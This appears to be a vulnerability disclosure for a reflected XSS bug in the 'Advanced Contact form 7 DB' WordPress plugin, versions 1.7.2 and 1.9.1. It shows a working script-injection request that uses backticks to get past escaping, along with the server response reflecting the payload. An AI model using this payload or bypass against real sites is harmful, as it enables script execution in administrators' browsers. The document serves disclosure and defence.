@@ -1,0 +1,54 @@
+Reflected XSS (Cross-Site Scripting) attack
+-------------------------------------------
+
+
+Vendor: Vsourz Digital
+
+Wordpress Plugin Versions: Advanced Contact form 7 DB - 1.7.2, 1.9.1
+
+Type: Remote attack
+
+
+
+We have identified that the “Advanced Contact form 7 DB - 1.7.2, 1.9.1” Wordpress Plugin Versions are vulnerable to Reflective Cross-site scripting (XSS). This is due to that the Web App fails to sanitize HTML/JavaScript code on the server-side. By leveraging this issue, an attacker is able to cause arbitrary HTML and JavaScript code to be executed in a user's browser (e.g. admin) within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+We have managed to bypass the client-side protection (URL Encoding) by intercepting the GET HTTP request using an HTTP proxy tool, and then inserting the XSS payload. Also, we have bypassed the server-side protection (Backslash Escaping) using backticks instead of single or double quotes.
+
+
+Below, evidence is provided.
+
+
+Request:
+GET /formsurvey/index.php/user/admin/?'><script>alert(`XSS`)</script><' HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Fri, 04 Nov 2022 12:56:09 GMT
+Server: Apache
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Link: <http://1.1.1.1/formsurvey/index.php/wp-json/>; rel="https://api.w.org/"
+Link: <http://1.1.1.1/formsurvey/?p=33>; rel=shortlink
+Vary: Accept-Encoding
+Content-Length: 31433
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+....
+....
+<link rel='canonical' href='http://1.1.1.1/formsurvey/index.php/user/admin/?\'><script>alert(`XSS`)</script><\'' />
+....
+....
+</html>
